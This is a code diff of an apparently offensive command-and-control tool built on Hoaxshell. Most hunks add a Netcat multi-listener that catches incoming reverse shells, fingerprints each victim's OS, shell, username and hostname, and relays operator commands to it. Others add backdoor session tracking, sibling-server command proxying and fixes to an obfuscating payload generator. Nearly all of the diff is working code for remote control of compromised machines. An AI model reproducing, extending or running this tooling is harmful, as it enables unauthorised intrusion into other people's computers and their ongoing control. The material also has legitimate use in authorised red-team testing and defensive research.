@@ -14,7 +14,7 @@ from datetime import date, datetime
 from ast import literal_eval
 from random import randint, choice, randrange
 from .common import *
-from .settings import Threading_params, Core_server_settings, Sessions_manager_settings, Hoaxshell_settings
+from .settings import Threading_params, Core_server_settings, Sessions_manager_settings, Hoaxshell_settings, Netcat_settings
 
 filterwarnings("ignore", category = DeprecationWarning)
 
@@ -90,6 +90,7 @@ class Payload_generator:
 			if 'os' in arguments:
 				if args_dict['os'].lower() in ['windows', 'linux', 'macos']:
 					os_type = args_dict['os'].lower()
+					del args_dict['os']
 				
 				else:
 					print('Unsupported OS type.')
@@ -116,7 +117,9 @@ class Payload_generator:
 					except:
 						print('Error parsing LHOST. Invalid IP or Interface.')
 						return
-						
+				
+				del args_dict['lhost']
+				
 			else:
 				
 				if (not Hoaxshell_settings.ssl_support) or ('domain' not in arguments):
@@ -136,6 +139,9 @@ class Payload_generator:
 				else:					
 					exec_outfile = False
 					print(f'Ignoring argument "exec_outfile" (not supported for {args_dict["os"]} payloads)')
+				
+				del args_dict['exec_outfile']
+				
 			else:
 				exec_outfile = False
 
@@ -155,6 +161,9 @@ class Payload_generator:
 				else:					
 					domain = False
 					print(f'Ignoring argument "domain" (not supported for {args_dict["os"]} payloads)')
+				
+				del args_dict['domain']
+				
 			else:
 				domain = False
 
@@ -165,7 +174,8 @@ class Payload_generator:
 				if item in arguments:
 					if item in self.supported[os_type]:
 						boolean_args[item] = True
-
+						del args_dict[item]
+						
 					else:
 						print(f'Ignoring argument "{item}" (not supported for {os_type} payloads)')
 		
@@ -218,7 +228,7 @@ class Payload_generator:
 				payload = payload.replace('*DISABLE_SSL_CHK*', '')
 			
 			Sessions_manager.legit_session_ids[session_unique_id] = {
-				'OS Type' : args_dict['os'].capitalize(),
+				'OS Type' : os_type.capitalize(),
 				'constraint_mode' : boolean_args['constraint_mode'],
 				'frequency' : frequency,
 				'exec_outfile' : exec_outfile if exec_outfile else False
@@ -227,6 +237,9 @@ class Payload_generator:
 		except:
 			print('Error parsing arguments. Check your input and try again.')
 			return
+		
+		for item in args_dict.keys():
+			print(f'Ignoring unrecognized argument "{item}".')
 			
 		payload = self.obfuscator.mask_payload(payload) if boolean_args['obfuscate'] else payload
 		payload = self.encodeUTF16(payload) if boolean_args['encode'] else payload
@@ -240,7 +253,6 @@ class Payload_generator:
 		
 		except:
 			print(f'{RED}Copy to clipboard failed. You need to do it manually.{END}')
-
 
 
 class Obfuscator:
@@ -528,6 +540,49 @@ class Sessions_manager:
 	
 	active_sessions = {}
 	legit_session_ids = {}
+	sessions_graveyard = []
+
+
+	def repair(self, session_id, key, new_val):
+		
+		key = 'Computername' if key == 'hostname' else key
+		key = key.capitalize() if key == 'username' else key
+		valid = self.repair_val_check(new_val)
+		
+		if valid == 0:
+		
+			try:
+				self.active_sessions[session_id][key] = new_val
+				return 0
+				
+			except:
+				return ['Failed to repair value.']
+		
+		else:
+			return valid	
+		
+		
+
+	def repair_val_check(self, value):
+		
+		if value[0] == '-':
+			return [f'Value cannot begin with a hyphen.']
+		
+		length = len(value)
+		
+		if length >= 2 and length <= 15:
+		
+			valid = ascii_uppercase + ascii_lowercase + '-' + digits
+			
+			for char in value:		
+				if char not in valid:
+					return [f'Value includes illegal character: "{char}".']
+			
+			return 0
+					
+		else:
+			return ['length must be between 2 to 15 characters.']		
+
 	
 	
 	def list_sessions(self):
@@ -537,6 +592,20 @@ class Sessions_manager:
 			print('\r')			
 			table = self.sessions_dict_to_list()
 			print_table(table, ['Session ID', 'IP Address', 'OS Type', 'User', 'Owner', 'Status'])			
+			print('\r')
+		
+		else:
+			print(f'No active sessions.')
+
+
+
+	def list_backdoors(self):
+
+		if self.active_sessions.keys():
+			
+			print('\r')			
+			table = self.sessions_dict_to_list()
+			print_table(table, ['Session ID', 'IP Address', 'Shell', 'Listener', 'User', 'Status'])			
 			print('\r')
 		
 		else:
@@ -611,15 +680,26 @@ class Sessions_manager:
 	def kill_session(self, session_id):
 		
 		if session_id in self.active_sessions.keys():
+			
 			if self.active_sessions[session_id]['Owner'] == Core_server.SERVER_UNIQUE_ID:
-				Hoaxshell.dropSession(session_id)
+				
+				self.sessions_graveyard.append(session_id)
+				
+				if self.active_sessions[session_id]['Status'] != 'Lost':
+					Hoaxshell.dropSession(session_id)	
+					
 				sleep(Hoaxshell_settings.default_frequency)
+				
+				if self.active_sessions[session_id]['Listener'] == 'hoaxshell':
+					session_id_components = session_id.split('-')
+					Hoaxshell.verify.remove(session_id_components[0])
+					Hoaxshell.get_cmd.remove(session_id_components[1])
+					Hoaxshell.post_res.remove(session_id_components[2])
+
 				self.active_sessions.pop(session_id, None)
 				self.legit_session_ids.pop(session_id, None)
-				session_id_components = session_id.split('-')
-				Hoaxshell.verify.remove(session_id_components[0])
-				Hoaxshell.get_cmd.remove(session_id_components[1])
-				Hoaxshell.post_res.remove(session_id_components[2])
+				del Hoaxshell.command_pool[session_id]
+					
 				print(f'[{INFO}] Session terminated.')
 				Core_server.announce_session_termination({'session_id' : session_id})
 				
@@ -628,6 +708,7 @@ class Sessions_manager:
 			
 		else:
 			print('Session invalid.')
+
 
 
 # -------------- Hoaxshell Server -------------- #
@@ -651,8 +732,8 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		Hoaxshell.prompt_ready = True
 
 
-
-	def search_output_for_signature(self, output):
+	@staticmethod
+	def search_output_for_signature(output):
 		
 		try:
 			sibling_server_id = re.findall("{[a-zA-Z0-9]{32}}", output)[-1].strip("{}")
@@ -683,7 +764,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 					output = ''
 
 			# Check if command was issued by a sibling server
-			sibling_signature = self.search_output_for_signature(output)
+			sibling_signature = Hoaxshell.search_output_for_signature(output)
 			
 			if sibling_signature:
 				output = output.replace('{' + sibling_signature + '}', '')
@@ -748,16 +829,26 @@ class Hoaxshell(BaseHTTPRequestHandler):
 							Hoaxshell.prompt_ready = False
 							
 							if is_remote_shell:
-								command = user_input + ";echo '{" + Core_server.SERVER_UNIQUE_ID + "}'"
-								Core_server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, command)								
+								
+								if Sessions_manager.active_sessions[session_id]['Shell'] == 'cmd.exe':
+									command = user_input + "&echo '{" + Core_server.SERVER_UNIQUE_ID + "}'"
+
+								elif Sessions_manager.active_sessions[session_id]['Shell'] == 'unix':
+									command = user_input + "&&echo '{" + Core_server.SERVER_UNIQUE_ID + "}'"
+								
+								else:
+									command = user_input + ";echo '{" + Core_server.SERVER_UNIQUE_ID + "}'"	
+																
+								Core_server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, command)
 								
 							else:	
 								Hoaxshell.command_pool[Hoaxshell.active_shell].append(user_input)
 
 						else:
-							print(f'\r[{INFO}] No active session.')		
+							print(f'\rNo active session.')		
 												
 				else:
+					sleep(0.1)
 					continue
 			
 			else:
@@ -810,6 +901,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 				Hoaxshell.verify.append(h[0])
 				Hoaxshell.get_cmd.append(h[1])
 				Hoaxshell.post_res.append(h[2])
+				
 				Sessions_manager.active_sessions[session_id] = {
 					'IP Address' : self.client_address[0], 
 					'Port' : self.client_address[1],
@@ -821,7 +913,9 @@ class Hoaxshell(BaseHTTPRequestHandler):
 					'Owner' : Hoaxshell.server_unique_id,
 					'self_owned' : True,
 					'aliased' : False, 
-					'alias' : None
+					'alias' : None,
+					'Listener' : 'hoaxshell',
+					'Shell': 'hoaxshell'
 				}
 				
 				Hoaxshell.command_pool[session_id] = []
@@ -931,8 +1025,8 @@ class Hoaxshell(BaseHTTPRequestHandler):
 						Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()
 					
 					elif isinstance(output, list):
-						Core_server.send_receive_one_encrypted(output[0], output[1], 'command_output', 30)
-
+						try: Core_server.send_receive_one_encrypted(output[0], output[1], 'command_output', 30)
+						except: pass
 						
 				except ConnectionResetError:
 					
@@ -943,7 +1037,8 @@ class Hoaxshell(BaseHTTPRequestHandler):
 						Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()
 						
 					elif isinstance(output, list):
-						Core_server.send_receive_one_encrypted(output[0], error_msg, 'command_output', 30)
+						try: Core_server.send_receive_one_encrypted(output[0], error_msg, 'command_output', 30)
+						except: pass
 						
 					del error_msg
 					
@@ -975,19 +1070,29 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		return
 
 
+
 	@staticmethod
 	def dropSession(session_id):
 		
 		os_type = Sessions_manager.active_sessions[session_id]['OS Type']
 		outfile = Sessions_manager.legit_session_ids[session_id]['exec_outfile']
-		exit_command = 'stop-process $PID' if os_type  == 'Windows' else 'echo byee'
 		
-		if (os_type == 'Windows' and not outfile) or os_type == 'Linux':
+		if Sessions_manager.active_sessions[session_id]['Listener'] == 'hoaxshell':
+			
+			exit_command = 'stop-process $PID' if os_type  == 'Windows' else 'echo byee'
+		
+			if (os_type == 'Windows' and not outfile) or os_type == 'Linux':
+				Hoaxshell.command_pool[session_id].append(exit_command)
+				
+			elif os_type == 'Windows' and outfile:
+				Hoaxshell.command_pool[session_id].append(f'quit')
+		
+		
+		elif Sessions_manager.active_sessions[session_id]['Listener'] == 'netcat':
+			
+			exit_command = 'exit'
 			Hoaxshell.command_pool[session_id].append(exit_command)
 			
-		elif os_type == 'Windows' and outfile:
-			Hoaxshell.command_pool[session_id].append(f'quit')
-		
 
 
 	@staticmethod
@@ -1024,6 +1129,9 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		
 		while session_id in Sessions_manager.active_sessions.keys():
 
+			if session_id in Sessions_manager.sessions_graveyard:
+				break
+
 			timestamp = int(datetime.now().timestamp())
 			tlimit = (Hoaxshell_settings.default_frequency + Sessions_manager_settings.shell_state_change_after)
 			last_received = Sessions_manager.active_sessions[session_id]['last_received']
@@ -1038,10 +1146,11 @@ class Hoaxshell(BaseHTTPRequestHandler):
 				Sessions_manager.active_sessions[session_id]['Status'] = 'Active'
 				Core_server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_manager.active_sessions[session_id]['Status']})
 				
-			sleep(5)
+			sleep(3)
 			
 		else:
 			Threading_params.thread_limiter.release()
+			return
 
 
 
@@ -1058,13 +1167,13 @@ def initiate_hoax_server():
 		
 		try:
 			httpd = HTTPServer((Hoaxshell_settings.bind_address, port), Hoaxshell)
-
+			
 		except OSError:
 			exit(f'[{DEBUG}] Hoaxshell HTTP server failed to start. Port {port} seems to already be in use.\n')
 		
 		except:
 			exit(f'\n[{DEBUG}] Hoaxshell HTTP server failed to start (Unknown error occurred).\n')
-
+		
 		if Hoaxshell_settings.ssl_support:
 			httpd.socket = ssl.wrap_socket (
 				httpd.socket,
@@ -1229,11 +1338,18 @@ class Core_server:
 													
 					elif decrypted_data[0] == 'command_output':
 						
-						print(f'\r{GREEN}{decrypted_data[1]}{END}')
+						if decrypted_data[0] == 'Awaiting for response reached the defined timeout.':
+							print(f'\r{ORANGE}{decrypted_data[1]}{END}')
+							
+						else:
+							ansi_detected = ansi_codes_detected(decrypted_data[1])
+							print(f'\r{GREEN}{decrypted_data[1]}{END}') if not ansi_detected else print(f'\r{decrypted_data[1]}')
+							
 						Core_server.send_msg(conn, self.response_ack(sibling_id))
+						Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()
 						
-						if Hoaxshell.active_shell:
-							Hoaxshell.prompt_ready = True
+						# ~ if Hoaxshell.active_shell:
+							# ~ Hoaxshell.prompt_ready = True
 
 
 
@@ -1254,16 +1370,20 @@ class Core_server:
 						session_id = decrypted_data[1]['session_id']
 						Sessions_manager.active_sessions[session_id]['Status'] = decrypted_data[1]['Status']		
 						Core_server.send_msg(conn, self.response_ack(sibling_id))
-						status = f'{GREEN}Active{END}' if decrypted_data[1]['Status'] == 'Active' else f'{ORANGE}Undefined{END}'
+						
+						if decrypted_data[1]['Status'] == 'Active':
+							status = f'{GREEN}Active{END}'
+							
+						elif decrypted_data[1]['Status'] == 'Lost':
+							status = f'{LRED}Lost{END}'
+						
+						else:
+							status = f'{ORANGE}Undefined{END}'
+							
 						print(f'\r[{INFO}] Backdoor session {ORANGE}{session_id}{END} status changed to {status}.')
-
-						if Hoaxshell.active_shell == decrypted_data[1]['session_id']:
-							Hoaxshell.deactivate_shell()
-
-						Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+						Core_server.restore_prompt_after_lost_conn(decrypted_data[1]['session_id'])
 						del session_id, status
 						
-
 
 
 					elif decrypted_data[0] == 'session_terminated':
@@ -1325,7 +1445,8 @@ class Core_server:
 		
 		
 		except:
-			print('failed to process a request')
+			print(f'[{WARN}] failed to process a request.')
+			Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()
 			pass				
 				
 		conn.close()
@@ -1377,6 +1498,14 @@ class Core_server:
 		sock.sendall(msg)
 
 
+	@staticmethod
+	def restore_prompt_after_lost_conn(session_id):
+		
+		if Hoaxshell.active_shell == session_id:
+			Hoaxshell.deactivate_shell()
+
+		Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+	
 		
 		
 	def initiate(self):
@@ -1395,7 +1524,7 @@ class Core_server:
 			exit_with_msg('Core server failed to start (Unknown error occurred).\n')
 		
 		self.core_initialized = True	
-		print(f'\r[{INFO}] Core server listening on {ORANGE}{Core_server_settings.bind_address}{END}:{ORANGE}{Core_server_settings.bind_port}{END}')
+		print(f'\r[{INFO}] Core server started on {ORANGE}{Core_server_settings.bind_address}{END}:{ORANGE}{Core_server_settings.bind_port}{END}')
 
 		# Start listening for connections
 		server_socket.listen()
@@ -1730,6 +1859,7 @@ class Core_server:
 		# Check again if server in siblings
 		if sibling_id not in Core_server.sibling_servers.keys():
 			print(f'\r[{FAILED}] Failed to proxy the command. Connection with the sibling server may be lost.')
+			Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()
 			return
 		
 		# Send command to sibling
@@ -1762,10 +1892,18 @@ class Core_server:
 						response = Core_server.send_receive_one_encrypted(sibling_id, {0 : 0}, 'are_you_alive', 4)	
 
 						if response in ['connection_refused', 'timed_out', 'connection_reset', 'no_route_to_host', 'unknown_error']:
+							# Check if active shell against a session that belongs to the lost sibling
+							if Hoaxshell.active_shell in Sessions_manager.active_sessions.keys():
+								if Sessions_manager.active_sessions[Hoaxshell.active_shell]['Owner'] == sibling_id:
+									Hoaxshell.deactivate_shell()
+							
 							self.remove_all_sessions(sibling_id)
 							server_ip = self.sibling_servers[sibling_id]["Server IP"]
 							del self.sibling_servers[sibling_id]
 							print(f'\r[{WARN}] Connection with sibling server {ORANGE}{server_ip}{END} lost.')
+							
+							
+								
 							Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
 												
 					except:					
@@ -1807,3 +1945,483 @@ class Core_server:
 		
 		del siblings_clone, tmp
 		return siblings_list
+
+
+
+class Netcat_multi_listener:
+
+	listen = True
+	listener_initialized = None
+	
+	def initiate_nc_listener(self):
+		
+		try:
+			nc_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			nc_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+			nc_server.bind((Netcat_settings.bind_address, Netcat_settings.bind_port))
+			
+		except OSError:
+			self.listener_initialized = False
+			exit_with_msg(f'Netcat multi-listener failed to start. Port {Netcat_settings.bind_port} seems to be already in use.\n')
+		
+		except:
+			self.listener_initialized = False
+			exit_with_msg('Netcat multi-listener failed to start (Unknown error occurred).\n')
+			
+	
+		self.listener_initialized = True	
+		print(f'\r[{INFO}] Netcat multi-listener started on {ORANGE}{Netcat_settings.bind_address}{END}:{ORANGE}{Netcat_settings.bind_port}{END}')
+
+		# Start listening for connections
+		nc_server.listen()
+		
+		while self.listen:
+			conn, address = nc_server.accept()
+			Thread(target = self.nc_shell_handler, args = (conn, address)).start()	
+		
+		
+
+	def nc_shell_handler(self, conn, address):
+		
+		Threading_params.thread_limiter.acquire()
+		
+		try:
+			
+			timestamp = int(datetime.now().timestamp())	
+
+			# Create session unique id
+			session_id = f'{str(uuid4())[0:8]}-{str(uuid4())[0:8]}-{str(uuid4())[0:8]}'
+					
+			# Identify the OS, Hostname and User
+			win_cmd = False
+			cmd_echo = False
+			zsh = False
+			powershell = False
+			ps_try_msg_detected = False
+			ansi_detected = False
+			username = ''
+			ident_stat = True
+			broken_pipe = 0
+			
+			while not re.search('[a-zA-Z]', username):
+				
+				try:
+					
+					whoami = conn.sendall('{}\n'.format('whoami').encode('utf-8'))
+					username = self.dehash_prompt(self.recv_timeout(conn))
+					
+					# Check if powershell.exe
+					powershell = True if re.search('Windows PowerShell', username) else False
+					ps_try_msg_detected = True if re.search('Try the new cross-platform PowerShell', username) else False
+					
+					if powershell or ps_try_msg_detected:
+						
+						while not re.search('[a-zA-Z]>', username):
+							whoami = conn.sendall('{}\n'.format('whoami').encode('utf-8'))
+							username = self.dehash_prompt(self.recv_timeout(conn))	
+					
+					
+				except BrokenPipeError:
+					
+					if broken_pipe <= 1:
+						broken_pipe += 1
+						continue
+						
+					else:
+						ident_stat = 'BrokenPipeError'
+						break
+								
+				if username in ['ConnectionResetError']:
+					ident_stat = 'ConnectionResetError'
+					
+			
+			if isinstance(ident_stat, str):
+				print(f'\r[{FAILED}] Failed to establish a backdoor session: {ident_stat}.')
+				conn.close()
+				Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+				Threading_params.thread_limiter.release()
+				return	
+				
+		
+			# Check if cmd.exe
+			if re.search('Microsoft Corporation', username) and not powershell:
+				win_cmd = True
+				username = username.rsplit('\n', 1)[-1]
+			
+			elif re.search('whoami', username) and (len(username.split('\n')) > 1):
+				cmd_echo = True
+			
+			# Check if response includes ANSI sequences (bash / zsh)
+			if not win_cmd:
+				if username.count('[') and username.count(';') and re.search('[0-9]', username):
+					username = strip_ansi_codes(username)
+					ansi_detected = True
+					# ~ cmd_echo = True
+					username = username.split('\n')[-1]
+					username = self.remove_non_print(username)
+			
+			
+			if powershell or ps_try_msg_detected:
+				username = username.split('>', 1)[-1]
+			
+			if not ansi_detected:
+				username = username.split('\n')[0] if not cmd_echo else username.split('\n', 1)[1]
+			
+			# Check if zsh
+			if username.count('㉿'):
+				username = username.split('┌──(')[1]
+				username = username.split('㉿')[0]
+				zsh = True
+				
+			os_type = 'Windows' if (username.count('\\') and not ansi_detected) or (powershell or win_cmd) else 'Linux'
+			
+			# Characterize shell type
+			if os_type == 'Windows' and win_cmd:
+				shell = 'cmd.exe'
+				
+			elif (os_type == 'Windows' and not win_cmd) or powershell:
+				shell = 'powershell.exe'
+			
+			else:
+				shell = 'unix'
+			
+			
+			if os_type == 'Linux':
+				username = username.replace('shell>', '')
+				get_hostname = conn.sendall('{}\n'.format('hostname').encode('utf-8'))
+				response = self.recv_timeout(conn)
+				response = self.remove_non_print(response)
+				hostname = response if not cmd_echo else response.split('\n', 1)[1]
+				hostname = hostname.split('\n]0;')[0] if zsh else hostname
+
+			else:
+				tmp = username.split('\\')
+				hostname = tmp[0].upper()
+				
+				if powershell or ps_try_msg_detected:
+					
+					try:
+						username = tmp[1].split('PS ')[0]
+						
+					except:
+						print('##:' +username)
+						#username = tmp[1] 
+				else:
+					
+					try:
+						username = tmp[1] 
+					
+					except: 
+						print('#:' +tmp)
+		 
+			
+			Sessions_manager.active_sessions[session_id] = {
+				'IP Address' : address[0], 
+				'Port' : address[1],
+				'execution_verified' : False,
+				'Status' : 'Active',
+				'last_received' : timestamp,
+				'OS Type' : os_type,
+				'frequency' : 1,
+				'Owner' : Hoaxshell.server_unique_id,
+				'self_owned' : True,
+				'aliased' : False, 
+				'alias' : None,
+				'execution_verified' : True,
+				'Computername' : hostname.strip(' \n\r'),
+				'Username' : username.strip(' \n\r'),
+				'Listener' : 'netcat',
+				'Shell' : shell,
+			}
+
+			Sessions_manager.legit_session_ids[session_id] = {
+				'OS Type' : os_type,
+				'constraint_mode' : False,
+				'frequency' : Hoaxshell_settings.default_frequency,
+				'exec_outfile' : False
+			}
+			
+			Hoaxshell.command_pool[session_id] = []
+			print(f'\r[{GREEN}Shell{END}] Netcat session established on {ORANGE}{address[0]}{END}')
+			Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+				
+			new_session_data = deepcopy(Sessions_manager.active_sessions[session_id])
+			new_session_data['session_id'] = session_id
+			# ~ new_session_data['alias'] = None
+			# ~ new_session_data['aliased'] = False
+			new_session_data['self_owned'] = False	
+			Core_server.announce_new_session(new_session_data)
+			del new_session_data
+			sessions = None
+			
+			# Start connection state monitor
+			Thread(target = self.is_still_connected, args = (session_id, conn)).start()		
+		
+		except:
+			print(f'\r[{FAILED}] Failed to establish a backdoor session: {ident_stat}.')
+			conn.close()
+			Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+			Threading_params.thread_limiter.release()
+			return
+			
+
+		while True:
+			
+			if sessions: del sessions
+			sessions = clone_dict_keys(Sessions_manager.active_sessions)
+			
+			if session_id in sessions:
+								
+				if Hoaxshell.command_pool[session_id]:				
+
+					cmd = Hoaxshell.command_pool[session_id].pop(0)
+
+					# Check if command was issued by sibling
+					sibling_signature = self.search_cmd_for_signature(cmd)	
+					
+					if sibling_signature:
+						joint = self.get_cmd_joint(session_id)
+						cmd = cmd.replace(f'{joint}echo ' + '\'{' + sibling_signature + '}\'', '')
+						
+					try:
+						
+						if self.is_socket_closed(conn): 
+							raise ConnectionResetError
+						
+						timeout_start = time()					
+						conn.sendall('{}\n'.format(cmd).encode('utf-8'))
+						
+						if session_id in Sessions_manager.sessions_graveyard:
+							break
+						
+						response = self.recv_timeout(conn, cmd = cmd)
+						response = response if not cmd_echo else response.split('\n', 1)[1]
+						response = response if not zsh else response.rsplit('\n', 1)[0]					
+											
+						if win_cmd:
+							response = response.split('\n', 1)[1]
+
+					except:
+
+						response = ''
+						Sessions_manager.active_sessions[session_id]['Status'] = 'Lost'
+						status = f'{LRED}Lost{END}'
+						Core_server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_manager.active_sessions[session_id]['Status']})
+						print(f'\r[{INFO}] Connection with backdoor session {ORANGE}{session_id}{END} seems to be {status}.')
+						Core_server.restore_prompt_after_lost_conn(session_id)
+						break
+						
+					
+					if sibling_signature:
+						
+						try: Core_server.send_receive_one_encrypted(sibling_signature, response, 'command_output', 30)
+						except:	pass
+						
+					else:
+						response = response.lstrip("\r")
+						print(f'{GREEN}{response}{END}') if not ansi_detected else print(response)			
+						Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()
+					
+					# ~ if Sessions_manager.active_sessions[session_id]['Status'] != 'Active':
+						# ~ Sessions_manager.active_sessions[session_id]['Status'] = 'Active'
+						# ~ Core_server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_manager.active_sessions[session_id]['Status']})
+						# ~ print(f'\r[{INFO}] Connection with backdoor session {ORANGE}{session_id}{END} restored!')
+						# ~ Core_server.restore_prompt_after_lost_conn(session_id)
+						
+					del cmd
+						
+				
+				
+				else:
+					sleep(0.25)
+			
+			else:
+				break
+			
+		conn.close()
+		Threading_params.thread_limiter.release()
+		return
+		
+
+
+	def recv_timeout(self, sock, timeout = Netcat_settings.recv_timeout, exec_timeout = Netcat_settings.await_execution_timeout, cmd = False):
+		
+		sock.setblocking(0)
+		response = []
+		data = ''
+		begin = time()
+		echoed_out = False
+
+		while True:
+			
+			if response and time() - begin > timeout:
+				break
+				
+			elif time() - (begin + exec_timeout) > timeout:
+				Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()
+				break
+				
+			try:
+				
+				data = sock.recv(Netcat_settings.recv_timeout_buffer_size) #8192
+				
+				if data:
+					chunk = data.decode('utf-8')
+
+					if cmd:
+						
+						if re.match('^' + cmd, chunk) and not echoed_out:
+							
+							if (len(cmd) + 4) >= len(chunk):
+								echoed_out = True
+								continue
+								
+							else:
+								response.append(chunk)
+
+						else:
+							response.append(chunk)
+					
+					else:
+						response.append(chunk)
+					
+					begin = time()
+					timeout = 0.2
+					
+				else:
+					sleep(0.15)
+					
+			except ConnectionResetError:
+				print(f'\r[{FAILED}] Failed to establish a backdoor session: Connection reset by peer.')
+				Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+				return 'ConnectionResetError'
+						
+			except BlockingIOError:
+				pass
+
+		return self.clean_nc_response(''.join(response))
+
+
+
+
+	def dehash_prompt(self, response):
+				
+		response = response.replace('#', '')
+		response = response.replace('$', '')
+		response = response.strip(' \n\r')
+		return response		
+		
+
+
+	def clean_nc_response(self, response):
+		
+		response = response.rsplit('\n', 1)[0]
+		return response
+
+
+
+	def is_still_connected(self, session_id, conn):
+		
+		Threading_params.thread_limiter.acquire()
+		
+		while True:
+			
+			if session_id in Sessions_manager.sessions_graveyard:
+				break
+			
+			current_status = Sessions_manager.active_sessions[session_id]['Status']	
+			connection_lost = self.is_socket_closed(conn)
+
+			if connection_lost:
+				
+				if current_status == 'Active':
+					Sessions_manager.active_sessions[session_id]['Status'] = 'Lost'
+					status = f'{LRED}Lost{END}'
+					Core_server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_manager.active_sessions[session_id]['Status']})
+					print(f'\r[{INFO}] Connection with backdoor session {ORANGE}{session_id}{END} seems to be {status}.')
+					Core_server.restore_prompt_after_lost_conn(session_id)
+					break
+				
+			else:
+				
+				if current_status != 'Active':
+					Sessions_manager.active_sessions[session_id]['Status'] = 'Active'
+					Core_server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_manager.active_sessions[session_id]['Status']})
+												
+			sleep(2.5)
+				
+		Threading_params.thread_limiter.release()	
+		return	
+
+	
+	
+	def remove_non_print(self, text):
+		
+		text = strip_ansi_codes(text)
+		text = text.split('\n')
+		final = []
+		new = ''
+		
+		for line in text:
+			for c in line:
+				
+				ascii_ord = ord(c)
+				
+				if ascii_ord >= 33 and ascii_ord != 10:
+					new += c
+					
+			final.append(new)
+			new = ''
+		
+		return ('\n'.join(final)).replace('[?2004l', '')
+
+
+
+
+	def search_cmd_for_signature(self, cmd):
+		
+		try:
+			
+			sibling_server_id = re.findall("[\S]{1,2}echo '{[a-zA-Z0-9]{32}}'", cmd)[-1]
+			sibling_server_id = sibling_server_id.split('echo ')[1].strip('{}\'')
+			
+		except:
+			sibling_server_id = None
+		
+		return sibling_server_id
+
+
+
+	def get_cmd_joint(self, session_id):
+		
+		if Sessions_manager.active_sessions[session_id]['Shell'] == 'cmd.exe':
+			joint = "&"
+													
+		elif Sessions_manager.active_sessions[session_id]['Shell'] == 'unix':
+			joint = "&&"
+		
+		else:
+			joint = ";"
+		
+		return joint
+
+
+
+	def is_socket_closed(self, sock):
+		
+		try:
+
+			data = sock.recv(16, socket.MSG_PEEK) #socket.MSG_DONTWAIT 
+			if len(data) == 0:
+				return True
+				
+		except BlockingIOError:
+			return False
+			
+		except ConnectionResetError:
+			return True
+			
+		except:
+			return False
+			
+		return False
